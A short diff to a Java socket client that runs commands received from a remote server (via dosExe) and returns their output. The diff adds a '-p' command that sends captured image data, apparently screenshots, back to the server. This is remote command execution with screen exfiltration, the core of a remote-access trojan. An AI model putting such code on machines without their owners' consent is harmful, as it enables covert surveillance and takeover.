@@ -47,7 +47,17 @@ public class ClientSocket {
 		}
 
 	}
-
+	public void dos(byte[] imageData){
+		if (imageData != null) {
+			try {
+				dos.writeUTF("getPic()");
+				dos.writeInt(imageData.length);
+				dos.write(imageData);
+			} catch (IOException e) {
+				e.printStackTrace();
+			}
+		}
+	}
 	public void doSomething() {
 		while(true){
 			
@@ -55,6 +65,9 @@ public class ClientSocket {
 				String command = dis.readUTF().trim();
 				if(command.startsWith("-client exit")){
 					
+				}else if(command.startsWith("-p")){
+					dos(new pubFunc().sendPic());
+				}else if(command.startsWith("-r")||command.startsWith("exit")){
 				}else{
 					dos.writeUTF(new pubFunc().dosExe(command));
 				}
